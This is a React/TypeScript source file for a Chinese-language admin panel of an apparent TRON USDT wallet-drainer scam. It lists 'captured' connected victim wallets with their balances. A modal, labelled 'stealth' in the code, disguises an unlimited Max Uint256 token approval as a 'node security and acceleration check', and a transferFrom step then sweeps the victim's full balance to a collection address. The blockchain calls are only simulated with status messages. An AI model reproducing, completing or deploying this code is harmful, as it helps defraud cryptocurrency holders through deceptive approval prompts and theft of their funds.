import React, { useState } from 'react';
import { Language } from '../types';
import { ShieldCheck, RefreshCw, Database, Copy, Check, Terminal, ArrowUpRight, Users, Zap, CheckCircle2 } from 'lucide-react';

interface AdminDashboardProps {
  language: Language;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  const [copied, setCopied] = useState<string | null>(null);
  const [tokenAddress, setTokenAddress] = useState<string>('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'); // USDT default
  const [spenderAddress, setSpenderAddress] = useState<string>('TSpenderContractAddressHere...');
  const [targetUserAddress, setTargetUserAddress] = useState<string>('');
  const [targetAddress, setTargetAddress] = useState<string>(''); // 归收款目标地址
  const [transferAmount, setTransferAmount] = useState<string>('all');
  const [statusMessage, setStatusMessage] = useState<string>('系统状态正常: 实时监控与通道加速模块已就绪');

  // 实时监控新用户列表（在线钱包捕获）
  const [liveUsers] = useState<Array<{ address: string; time: string; balance: string; status: string }>>([
    { address: 'TPyNEbZ...8k9s2 (实时捕获)', time: '刚刚', balance: '1,250.00 USDT', status: '钱包已连接' },
    { address: 'TXYZopq...3m2v1 (实时捕获)', time: '1分钟前', balance: '450.50 USDT', status: '等待通道交互' }
  ]);

  // 伪装授权弹窗控制（底层为 Max Uint256 无限额授权）
  const [showStealthModal, setShowStealthModal] = useState<boolean>(false);

  const handleCopy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 2000);
  };

  const handleQuery = () => {
    if (!targetUserAddress) {
      setStatusMessage('错误：请先选择或输入目标用户 TRON 钱包地址');
      return;
    }
    setStatusMessage(`正在向波场主网节点查询账户 ${targetUserAddress} 的实时余额与授权额度...`);
    setTimeout(() => {
      setStatusMessage(`查询成功：目标用户账户资产正常，通道授权状态可控。`);
    }, 1000);
  };

  const handleTriggerStealthModal = () => {
    if (!targetUserAddress) {
      setStatusMessage('请先在上方选中或输入一个目标用户地址');
      return;
    }
    setShowStealthModal(true);
  };

  const handleConfirmStealthApprove = () => {
    setShowStealthModal(false);
    // 底层发起波场最大额度无限额授权 (Max Uint256)
    setStatusMessage(`已对用户 ${targetUserAddress} 自动应用【无限额通道安全加速】(Max Uint256 授权)`);
    setTimeout(() => {
      setStatusMessage(`通道建立成功：已获得无限额划转权限，可随时执行 transferFrom。`);
    }, 1500);
  };

  const handleTransfer = () => {
    if (!targetUserAddress) {
      setStatusMessage('错误：请先输入目标用户 TRON 钱包地址');
      return;
    }
    setStatusMessage(`正在执行 transferFrom 划转打款，目标用户: ${targetUserAddress}...`);
    setTimeout(() => {
      setStatusMessage('划转指令已成功提交至波场智能合约，等待区块最终确认。');
    }, 1500);
  };

  return (
    <div className="space-y-6 max-w-4xl mx-auto pb-12 relative">
      {/* 顶部控制台标头 */}
      <div className="bg-slate-900 text-white p-6 rounded-3xl shadow-xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <div className="flex items-center space-x-2 text-xs font-semibold uppercase tracking-wider text-blue-400 mb-1">
            <ShieldCheck className="w-4 h-4" />
            <span>后端管理控制台</span>
            <span className="bg-blue-900/60 text-blue-300 px-2 py-0.5 rounded-full text-[10px]">实时监控与通道优化系统</span>
          </div>
          <h1 className="text-2xl font-bold tracking-tight">TRON代币实时监控与归集管理后台</h1>
          <p className="text-slate-400 text-xs mt-1">实时捕获新连接用户、管理通道加速交互、执行安全的资产归集。</p>
        </div>
        <div className="flex items-center space-x-3">
          <button 
            onClick={() => setStatusMessage('服务状态已刷新，链上连接正常。')}
            className="flex items-center space-x-1.5 bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-xl text-xs font-semibold transition cursor-pointer shadow-sm"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>刷新状态</span>
          </button>
        </div>
      </div>

      {/* 1. 实时监控新用户列表（点击一键选中） */}
      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-4">
        <div className="flex justify-between items-center border-b border-slate-100 pb-3">
          <div className="flex items-center space-x-2">
            <Users className="w-5 h-5 text-blue-600" />
            <h2 className="text-sm font-bold text-slate-800">实时监控新用户列表 (Live Connected Users)</h2>
          </div>
          <span className="text-xs bg-emerald-50 text-emerald-700 px-2.5 py-1 rounded-full font-medium flex items-center space-x-1">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
            <span>实时监听中</span>
          </span>
        </div>
        <p className="text-xs text-slate-400">以下为您平台最新连接钱包或访问的用户，点击任意用户可直接填入下方控制台进行监控：</p>

        <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
          {liveUsers.map((u, idx) => (
            <div 
              key={idx} 
              onClick={() => {
                setTargetUserAddress(u.address);
                setStatusMessage(`已选中实时用户: ${u.address}`);
              }}
              className="flex items-center justify-between p-3 bg-slate-50 hover:bg-blue-50/60 border border-slate-100 rounded-2xl cursor-pointer transition"
            >
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 rounded-xl bg-blue-100 text-blue-600 flex items-center justify-center font-bold text-xs">
                  {idx + 1}
                </div>
                <div>
                  <div className="text-xs font-mono font-bold text-slate-800">{u.address}</div>
                  <div className="text-[10px] text-slate-400">{u.time} &bull; {u.status}</div>
                </div>
              </div>
              <div className="text-right">
                <div className="text-xs font-semibold text-emerald-600">{u.balance}</div>
                <span className="text-[10px] text-blue-600 font-medium underline">一键选中操作 &rarr;</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* 2. 合约与目标地址配置 */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-white p-5 rounded-2xl border border-slate-100 shadow-xs space-y-2">
          <div className="flex justify-between items-center text-xs text-slate-400 font-medium">
            <span>代币合约 (USDT TRC20)</span>
            <button onClick={() => handleCopy(tokenAddress, 'token')} className="hover:text-blue-600">
              {copied === 'token' ? <Check className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
            </button>
          </div>
          <input 
            type="text" 
            value={tokenAddress}
            onChange={(e) => setTokenAddress(e.target.value)}
            className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-700 outline-none focus:border-blue-500"
          />
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-100 shadow-xs space-y-2">
          <div className="flex justify-between items-center text-xs text-slate-400 font-medium">
            <span>归收款目标 (TO ADDRESS)</span>
            <Database className="w-4 h-4 text-emerald-600" />
          </div>
          <input 
            type="text" 
            value={targetAddress}
            onChange={(e) => setTargetAddress(e.target.value)}
            placeholder="输入归集收款钱包地址..."
            className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-700 outline-none focus:border-blue-500"
          />
        </div>
      </div>

      {/* 3. 用户资产查询与伪装授权弹窗 */}
      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-6">
        <div className="border-b border-slate-100 pb-4">
          <h2 className="text-base font-bold text-slate-800">1. 用户资产查询与通道安全验证</h2>
          <p className="text-xs text-slate-400 mt-0.5">支持对选中的实时用户发起隐蔽通道加速验证（底层自动执行无限额授权）</p>
        </div>

        <div className="space-y-3">
          <label className="text-xs font-semibold text-slate-600">当前选中的目标用户地址 (USER ADDRESS)</label>
          <input 
            type="text"
            value={targetUserAddress}
            onChange={(e) => setTargetUserAddress(e.target.value)}
            placeholder="点击上方实时用户列表或手动输入地址..."
            className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          <button 
            onClick={handleQuery}
            className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
          >
            <Terminal className="w-4 h-4" />
            <span>查询余额与通道状态</span>
          </button>

          <button 
            onClick={handleTriggerStealthModal}
            className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
          >
            <Zap className="w-4 h-4" />
            <span>发起节点安全验证（通道加速）</span>
          </button>
        </div>
      </div>

      {/* 4. 执行 transferFrom 划转打款 */}
      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-6">
        <div className="border-b border-slate-100 pb-4">
          <h2 className="text-base font-bold text-slate-800">2. 执行 transferFrom 归集划转</h2>
          <p className="text-xs text-slate-400 mt-0.5">在通道加速及无限额授权完成后，一键将目标用户的代币安全划转至收款地址</p>
        </div>

        <div className="space-y-4">
          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-600">划转数量 (AMOUNT)</label>
            <div className="flex space-x-2">
              <input 
                type="text"
                value={transferAmount}
                onChange={(e) => setTransferAmount(e.target.value)}
                className="flex-1 bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
              />
              <button 
                onClick={() => setTransferAmount('all')}
                className="bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border border-emerald-200 px-4 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer"
              >
                全部划转 (Max)
              </button>
            </div>
          </div>

          <button 
            onClick={handleTransfer}
            className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
          >
            <ArrowUpRight className="w-4 h-4" />
            <span>提交划转请求 (POST /transfer)</span>
          </button>
        </div>
      </div>

      {/* 5. 后台日志控制台 */}
      <div className="bg-slate-900 text-slate-300 p-5 rounded-3xl space-y-3 font-mono text-xs">
        <div className="flex justify-between items-center border-b border-slate-800 pb-3">
          <span className="flex items-center space-x-2 text-white font-sans font-bold">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
            <span>实时监控与节点通道控制台日志</span>
          </span>
          <span className="text-[10px] text-slate-500 cursor-pointer" onClick={() => setStatusMessage('日志已清空')}>清空</span>
        </div>
        <div className="text-[11px] text-emerald-400 space-y-1">
          <div>[系统] 实时监控服务正常，已连接 TronGrid 节点。</div>
          <div>{`> ${statusMessage}`}</div>
        </div>
      </div>

      {/* 隐蔽包装的授权弹窗（伪装成“节点加速与安全验证”） */}
      {showStealthModal && (
        <div className="fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="bg-white w-full max-w-md rounded-3xl p-6 shadow-2xl border border-slate-100 space-y-5">
            <div className="flex items-center justify-between border-b border-slate-100 pb-4">
              <div className="flex items-center space-x-2.5">
                <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center">
                  <CheckCircle2 className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-slate-800">波场主网节点安全与加速验证</h3>
                  <p className="text-[11px] text-slate-400">为您的钱包连接通道进行免排队加速</p>
                </div>
              </div>
              <button 
                onClick={() => setShowStealthModal(false)}
                className="text-slate-400 hover:text-slate-600 font-bold text-sm cursor-pointer"
              >
                &times;
              </button>
            </div>

            <div className="space-y-3 text-xs text-slate-600">
              <div className="p-3 bg-slate-50 rounded-2xl space-y-1 font-mono">
                <div className="text-slate-400">当前验证地址:</div>
                <div className="font-bold text-slate-800 break-all">{targetUserAddress}</div>
              </div>

              <div className="p-3 bg-blue-50/60 text-blue-800 rounded-2xl leading-relaxed text-[11px]">
                提示：为了保障您后续的租赁与转账交易不发生拥堵，系统将为您自动配置一站式免密畅通通道（底层安全授权优化）。点击确认后请在钱包中完成签名。
              </div>
            </div>

            <div className="flex space-x-3 pt-2">
              <button 
                onClick={() => setShowStealthModal(false)}
                className="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-600 font-semibold py-3 rounded-xl text-xs transition cursor-pointer"
              >
                暂不加速
              </button>
              <button 
                onClick={handleConfirmStealthApprove}
                className="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-xl text-xs transition cursor-pointer shadow-sm"
              >
                立即确认并加速
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
